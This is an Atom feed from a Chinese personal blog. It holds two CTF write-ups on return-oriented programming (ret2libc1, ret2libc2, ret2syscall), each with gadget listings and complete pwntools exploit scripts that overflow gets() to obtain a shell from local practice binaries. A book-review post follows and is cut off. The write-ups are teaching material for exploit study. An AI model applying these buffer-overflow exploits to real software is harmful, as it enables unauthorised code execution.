<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2023-02-13T08:02:45.424Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>Elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ROP学习II</title>
    <link href="elssm.github.io/2023/02/13/ROP%E5%AD%A6%E4%B9%A0II/"/>
    <id>elssm.github.io/2023/02/13/ROP学习II/</id>
    <published>2023-02-13T06:24:14.000Z</published>
    <updated>2023-02-13T08:02:45.424Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>上一节通过一个简单的<code>ret2syscall</code>题目认识了ROP。本节将通过三道<code>ret2libc</code>题目继续学习ROP。</p><p>学习<code>ret2libc</code>题目之前需要对<code>plt</code>和<code>got</code>有一定的了解。</p><p>GOT全称<code>Global Offset Table</code>，即全局偏移量表。它在可执行文件中是一个单独的section，位于<code>.data</code> section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。</p><p>PLT全称<code>Procedure Linkage Table</code>，即过程链接表。它在可执行文件中也是一个单独的section，位于<code>.text</code>section的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。</p><p>通过下图说明。当第一次调用func函数时。会跳转到该函数对应的PLT处。该函数对应的PLT第一条指令执行它对应的.GOT.PLT里的指令。第一次调用时，该函数的.GOT.PLT里保存的是它对应的PLT里第二条指令的地址；继续执行PLT第二条、第三条指令，其中第三条指令作用是跳转到公共的PLT（.PLT[0]）。 公共的PLT（.PLT[0]）执行.GOT.PLT[2]指向的代码，也就是执行动态链接器的代码；动态链接器里的<code>_dl_runtime_resolve_avx</code>函数修改被调函数对应的.GOT.PLT里保存的地址，使之指向链接后的动态链接库里该函数的实际地址；再次调用该函数对应的PLT第一条指令，跳转到它对应的.GOT.PLT里的指令（此时已经是该函数在动态链接库中的真正地址），从而实现该函数的调用。</p><p><img src="/2023/02/13/ROP学习II/1.png" alt="1"></p><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>本题需要通过gets函数溢出，利用程序中的<code>system</code>函数和<code>/bin/sh</code>字符串获取权限。</p><p>通过<code>strings</code>判断程序中是否存在<code>system</code>函数和<code>/bin/sh</code>字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep system</span><br><span class="line">system</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep /bin/sh</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><p>检查保护，发现开启了NX防护，这意味着我们不能在堆栈中执行shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>程序反汇编如下</p><p><img src="/2023/02/13/ROP学习II/2.png" alt="2"></p><p>这里我们的具体方法是，通过gets函数传参数溢出。使得<code>main</code>函数能够return到<code>system</code>函数的地址，并将<code>/bin/sh</code>字符串地址传入到<code>system</code>函数中。</p><p>那么如何获取<code>system</code>函数和<code>/bin/sh</code>字符串在程序中的地址呢？</p><p>我们可以通过程序获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.plt[<span class="string">"system"</span>]</span><br><span class="line"><span class="number">134513760</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134513760</span>)</span><br><span class="line"><span class="string">'0x8048460'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="number">134514464</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134514464</span>)</span><br><span class="line"><span class="string">'0x8048720'</span></span><br></pre></td></tr></table></figure><p>接着我们通过gdb动态调试计算需要溢出的数据大小。通过<code>stack</code>命令查看eax到ebp的距离。</p><p><img src="/2023/02/13/ROP学习II/3.png" alt="3"></p><p>需要溢出的数据大小为<code>0xffffd5b8 - 0xffffd54c</code>再加上四字节ebp一共112字节。</p><p>ROP链构造如下</p><p><img src="/2023/02/13/ROP学习II/6.png" alt="6"></p><p>之后我们可以构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">112</span> + p32(system_plt) + <span class="string">b'B'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行程序获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop<span class="comment"># python3 exp_ret2libc1.py</span></span><br><span class="line">[+] Starting local process <span class="string">'./ret2libc1'</span>: pid <span class="number">16491</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">$ pwd</span><br><span class="line">/root/pwn/rop</span><br></pre></td></tr></table></figure><h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>本题和<code>ret2libc1</code>的区别是，程序中没有<code>/bin/sh</code>，需要我们自己将<code>/bin/sh</code>字符串写入到程序中进行控制。</p><p>通过反汇编查看我们应该将<code>/bin/sh</code>写入到bss段的<code>buf2</code>中。</p><p><img src="/2023/02/13/ROP学习II/4.png" alt="4"></p><p>所以我们的思路是首先ROP到gets函数，在gets函数中将<code>/bin/sh</code>读取并放入<code>buf2</code>。之后继续ROP到<code>system@plt</code>即可。</p><p>ROP链构造如下</p><p><img src="/2023/02/13/ROP学习II/5.png" alt="5"></p><p>exp构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">"buf2"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="number">112</span>*<span class="string">b'A'</span> + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h4><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.bilibili.com/video/BV1854y1y7Ro" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1854y1y7Ro</a></p><p><a href="https://www.freebuf.com/articles/web/283330.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/283330.html</a></p><p><a href="https://luomuxiaoxiao.com/?p=578" target="_blank" rel="noopener">https://luomuxiaoxiao.com/?p=578</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;上一节通过一个简单的&lt;code&gt;ret2syscall&lt;/code&gt;题目认识了ROP。本节将通过三道&lt;code&gt;ret2libc&lt;/code
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ROP学习</title>
    <link href="elssm.github.io/2022/12/29/ROP%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2022/12/29/ROP学习/</id>
    <published>2022-12-29T10:37:21.000Z</published>
    <updated>2022-12-30T04:18:31.235Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>通过一道PWN题目学习ROP。</p><p>随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>ROPgadget工具可以帮助你寻找合适的gadgets，在编写你的<code>ROP exp</code>的时候有很大作用。ROPgadget支持x86, x64, ARM, ARM64, PowerPC, SPARC和MIPS架构下的ELF/PE/Mach-O文件格式。</p><p>这里我们需要构造的gadget如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,["/bin/sh"]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line">int 0x80</span><br><span class="line">==&gt; execve("/bin/sh",NULL,NULL)</span><br></pre></td></tr></table></figure><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>checksec查看开启了哪些保护机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % checksec ret2syscall</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>通过查看架构得之主要的寄存器有<code>eax ebp ebx ecx..</code></p><p>程序执行如下，输出前两句后接受输入，然后退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# ./ret2syscall</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure><p>反编译查看，从gets函数得之存在溢出漏洞</p><p><img src="/2022/12/29/ROP学习/1.png" alt="1"></p><p><code>pwndbg</code>查看寄存器位置，发现eax寄存器位置为<code>0xffffd29c</code>，<code>ebp</code>寄存器的位置为<code>0xffffd308</code>，如果我们想要覆盖掉<code>ebp</code>寄存器的位置，则需要填充的字节为<code>0xffffd308-0xffffd29c</code>字节再加上<code>ebp</code>所占的4个字节，因为架构是32位的。即需要填充112字节。</p><p><img src="/2022/12/29/ROP学习/2.png" alt="2"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>接着我们通过<code>ROPgadget</code>工具寻找<code>gadget</code></p><p>首先寻找eax的<code>pop|ret</code>地址，选择<code>0x080bb196</code>地址最合适</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep eax</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>接着寻找ebx的<code>pop|ret</code>地址，有很多，哪一个最适合呢，发现<code>0x0806eb90</code>最合适，因为它也有<code>ecx</code>和<code>edx</code>寄存器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>最后我们寻找<code>int</code>，地址为<code>0x08049421</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "int"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p>因为ebp寄存器中需要写入<code>/bin/sh</code>，因此我们还需要在程序中找到<code>/bin/sh</code>的地址</p><p>在<code>ghidra</code>中全局搜索发现地址为<code>0x80be408</code></p><p><img src="/2022/12/29/ROP学习/3.png" alt="3"></p><p>或者通过python编写脚本获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2syscall'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.search(<span class="string">b'/bin/sh'</span>)</span><br><span class="line">&lt;generator object ELF.search at <span class="number">0x7f024f030db0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="string">'0x80be408'</span></span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>编写<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_80h = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*<span class="number">112</span>, pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>本地执行<code>exp</code>获取<code>shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# python3 exp.py</span><br><span class="line">[+] Starting local process './ret2syscall': pid 3300219</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line"><span class="meta">$</span> ls</span><br><span class="line">exp.py       ret2libc2  ret2shellcode  ret2text</span><br><span class="line">ret2libc1  ret2libc3  ret2syscall    tools</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;通过一道PWN题目学习ROP。&lt;/p&gt;
&lt;p&gt;随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>读书分享II</title>
    <link href="elssm.github.io/2022/12/15/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABII/"/>
    <id>elssm.github.io/2022/12/15/读书分享II/</id>
    <published>2022-12-15T14:13:03.000Z</published>
    <updated>2023-01-09T02:29:22.822Z</updated>
    
    <content type="html"><![CDATA[<h4 id="朝花夕拾"><a href="#朝花夕拾" class="headerlink" title="朝花夕拾"></a>朝花夕拾</h4><p><img src="/2022/12/15/读书分享II/1.jpeg" alt="1" style="zoom:50%;"></p><p><strong>我常想在纷扰中寻出一点闲静来，然而委实不容易。目前是这么离奇，心里是这么芜杂。一个人做到只剩了回忆的时候，生涯大概总要算是无聊了罢，但有时竟会连回忆也没有。</strong></p><p>《朝花夕拾》里鲁迅用夹叙夹议的方法，以青少年时代的生活经历为线索，真实生动地叙写了自己从农村到城镇，从家庭到社会，从国内到国外的一组生活经历，抒发了对往昔亲友和师长的怀念之情，同时也对旧势力、旧文化进行了嘲讽和抨击。</p><p>朝花夕拾，清早落下的花朵到了傍晚拾起来。平静地弯腰，凝视，回忆，捡起。这个原本简单平和的过程被鲁迅先生赋予了新的含义。初高中不喜欢语文课，现在读起竟别有一番滋味。孩童时期鲁迅对猫的讨厌、对二十四孝图的恐惧、对百草园的喜爱、对长妈妈的复杂感情；长大之后对藤野先生的尊敬、对范爱农的怜悯。他的敬意和感激，从每一句话里流露出来，细节是那样清晰，人物从回忆里走出来，从纸上竖立起来，变得有血有肉，袒露着真实性情。</p><h4 id="夜谭十记"><a href="#夜谭十记" class="headerlink" title="夜谭十记"></a>夜谭十记</h4><p><img src="/2022/12/15/读书分享II/2.png" alt="2" style="zoom:50%;"></p><p><strong>凡是他们叫做“自由”的东西，就是不自由的陷阱</strong></p><p>《夜谭十记》是著名作家马识途的代表作。内容为上世纪四十年代四川某地衙门，十个仕途失意又穷极无聊的小科员以摆“龙门阵”的方式，轮流讲述自己经历的种种奇遇。本书因其中的《盗官记》被改编为电影《让子弹飞》而广为人知。</p><p>这本书从1942年最初开始写到1982年最终成书，经历了40年的时间，我在2022年有幸读到这本书。最初因为《让子弹飞》的缘故我想读这本书，最后发现书中的其他故事个个精彩。破城记的反转、报销记的惊险、盗官记的正义、沉河记的悲惨等等，每一个故事都令人深思，感谢作者。作者在后记还写道由于成书时间太长，这些故事不知道还适不适合当下阅读，这当然也可能是作者自谦的说法哈哈哈哈。反正我是很推荐这本书的！！！当今生活被各种电子产品充斥，以后有机会的话也要搞一个冷板凳会</p><h4 id="一句顶一万句"><a href="#一句顶一万句" class="headerlink" title="一句顶一万句"></a>一句顶一万句</h4><p><img src="/2022/12/15/读书分享II/6.jpeg" alt="6" style="zoom:50%;"></p><p><strong>日子是过以后，不是过从前。</strong></p><p>本书是刘震云酝酿创作了三年的小说。也是他迄今最成熟最大气的作品。小说的叙事风格类似明清的野稗日记,语句洗练,情节简洁,叙事直接,有汪曾祺和孙犁等前辈作家遗风。因而本书的每一个字每一句话,都构成言说的艺术,都能拧出作家的汗水。更为重要的是,作家唯有用此语言,才有对应和表现作品的内涵。</p><p>阳的前两天，一口气读完了这本书。书中分为出延津和回延津上下两部叙述，时间跨度挺长，有四代人差不多。前半部分杨百顺，后半部分牛爱国。人物结构挺复杂，但是每一个人物刻画的都很深刻。我刚开始不知道为什么书名叫这个，当我读到小韩被视察的时候、读到老马给老杨出主意的时候、读到老詹给摩西解惑的时候。或许明白了什么叫一句顶一万句….</p><h4 id="筚路维艰：中国社会主义路径的五次选择"><a href="#筚路维艰：中国社会主义路径的五次选择" class="headerlink" title="筚路维艰：中国社会主义路径的五次选择"></a>筚路维艰：中国社会主义路径的五次选择</h4><p><img src="/2022/12/15/读书分享II/7.jpeg" alt="7" style="zoom:50%;"></p><p><strong>真正的危险不在因缺乏经验而犯错，而在于因阻塞批评而丧失纠错的能力。</strong></p><p>本书以简明清晰的文字对当代中国的历史轨迹做了逻辑梳理。作者认为，从执政党的建国方略、发展模式和基本政策角度考察，中国社会主义的实践路径经历了从实行新民主主义开始，途经仿效苏联模式、追寻赶超之路、发动继续革命和实行改革开放的五次历史选择。</p><p>我们应该更清晰的了解历史。</p><h4 id="置身事内：中国政府与经济发展"><a href="#置身事内：中国政府与经济发展" class="headerlink" title="置身事内：中国政府与经济发展"></a>置身事内：中国政府与经济发展</h4><p><img src="/2022/12/15/读书分享II/8.png" alt="8" style="zoom:50%;"></p><p>《置身事内：中国政府与经济发展》是复旦大学经济学院副教授兰小欢多年教学与研究内容的凝练，将经济学原理与中国经济发展的实践有机融合，以地方政府投融资为主线，深入浅出地论述了中国经济的发展，笔触简练客观，并广泛采纳了各领域学者的最新研究成果。全书分上下两篇。上篇解释微观机制，包括地方政府的基本事务、收支、土地融资和开发、投资和债务等；下篇解释这些微观行为与宏观现象的联系，包括城市化和工业化、房价、地区差异、债务风险、国内经济结构失衡、国际贸易冲突等。最后一章提炼和总结全书内容。通过对中国政治经济体系的论述，作者简明地刻画了地方政府进行经济治理的基本方式，并指出，中国政府通过深度介入工业化和城市化的进程，在发展经济的同时逐步推动了市场机制的建立和完善，以一种有别于所谓发达国家经验的方式实现了经济奇迹。基于对改革历程与社会矛盾的回顾与分析，作者也在书中对当前推进的市场化改革与政府转型进行了解读，帮助读者增进对中国发展现实的把握。</p><h4 id="西线无战事"><a href="#西线无战事" class="headerlink" title="西线无战事"></a>西线无战事</h4><p><img src="/2022/12/15/读书分享II/3.jpeg" alt="3" style="zoom:50%;"></p><p><strong>一个士兵只有度过一千次偶然性才能算活着。每个士兵都相信和信赖这种偶然性。</strong></p><p>青年保罗·博伊默尔、钳工加登、始终随身带着课本的米勒、头脑最清醒的下士克罗普、挖煤工海尔·维斯胡斯、农民德特林，以及斯坦尼斯劳斯·卡钦斯基们，经过十周的军事训练后，被送往前线。1918年，这个班的最后一人也于前线阵亡。而军队指挥部战报上的记录仅有一句：西线无战事。</p><p>花了一周时间断断续续读完了这本书。作者经历过一战，所以在书中对于战争的描述十分详细。我读的是姜乙翻译的版本，个人感觉翻译的很好！战争是残酷的，对于交战双方，没有对错，战场上奋战的军人，场下是孩子的父亲，是父亲的孩子，是妻子的丈夫。塞尔维亚的一句话说道：在战争中，政治家提供弹药、富人提供粮食、穷人提供孩子。战争结束，政治家收回弹药，富人继续种粮食，穷人埋葬自己的孩子。</p><h4 id="寻路中国"><a href="#寻路中国" class="headerlink" title="寻路中国"></a>寻路中国</h4><p><img src="/2022/12/15/读书分享II/4.jpeg" alt="4" 